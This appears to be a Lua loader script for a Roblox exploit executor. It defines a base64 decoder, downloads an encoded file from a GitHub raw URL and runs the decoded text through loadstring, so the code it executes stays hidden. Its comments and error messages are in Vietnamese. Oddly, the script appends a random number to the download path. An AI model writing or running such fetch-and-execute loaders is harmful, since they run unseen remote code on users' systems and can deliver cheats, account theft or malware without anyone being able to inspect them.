local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function decodeBase64(data)
    data = string.gsub(data, '[%s\r\n]', '')
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do 
            r = r .. (f % 2^i - f % 2^(i - 1) >= 2^(i - 1) and '1' or '0') 
        end
        return r
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do 
            c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) 
        end
        return string.char(c)
    end))
end

-- Link Raw chuẩn tới file pain3937376
local rawUrl = "https://raw.githubusercontent.com/hbom4975-max/Bom/refs/heads/main/V2" .. math.random(1, 100000)

local success, result = pcall(function()
    local encodedData = game:HttpGet(rawUrl)
    local decodedCode = decodeBase64(encodedData)
    
    if decodedCode == "" or #decodedCode == 0 then
        warn("LỖI: Không thể lấy dữ liệu từ GitHub!")
    else
        local func, err = loadstring(decodedCode)
        if func then
            func()
        else
            warn("LỖI CÚ PHÁP LUA GỐC:", err)
        end
    end
end)

if not success then
    warn("LỖI TẢI FILE:", result)
end
